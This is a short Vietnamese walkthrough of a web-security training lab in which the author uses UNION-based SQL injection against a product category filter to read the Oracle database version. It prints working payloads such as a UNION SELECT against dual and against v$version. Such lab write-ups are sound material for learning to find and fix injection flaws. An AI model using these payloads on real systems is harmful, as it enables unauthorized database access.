# Đầu bài cho biết:
- Có lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm.
- Có thể sử dụng tấn công UNION để truy xuất kết quả từ truy vấn được tiêm vào.
- Hệ thống sử dụng cơ sở dữ liệu Oracle.

# Yêu cầu:
- Hiển thị chuỗi phiên bản cơ sở dữ liệu Oracle.

# Solution:

- Đầu tiên, sử dụng `ORDER BY` để kiểm tra số cột

![image](https://github.com/user-attachments/assets/f10dc9de-a902-4ede-a2bd-43620824d375)

- Thử đến cột thứ 3 thì bị báo lỗi => Có 2 cột
- Thử lại với `' UNION SELECT NULL, NULL FROM dual--`

![image](https://github.com/user-attachments/assets/4ab55c9c-805e-42bc-9527-bb114e71c4f3)

- Bây giờ thì thử xem trong 2 cột thì đâu là chuỗi

![image](https://github.com/user-attachments/assets/751045fc-d453-4d3a-9be7-423f090135a0)

- Có vẻ cả 2 đều là chuỗi
- Check trong cheat sheet thì có 2 cách để lấy đc phiên bản trong Oracle

![image](https://github.com/user-attachments/assets/066de6ac-f5c7-4ea2-a9ea-c8d851360e18)

- Thử với `' UNION SELECT 'a', banner FROM v$version--`

![image](https://github.com/user-attachments/assets/d7fe49e2-4f3e-406e-aa86-2ce6686622ba)




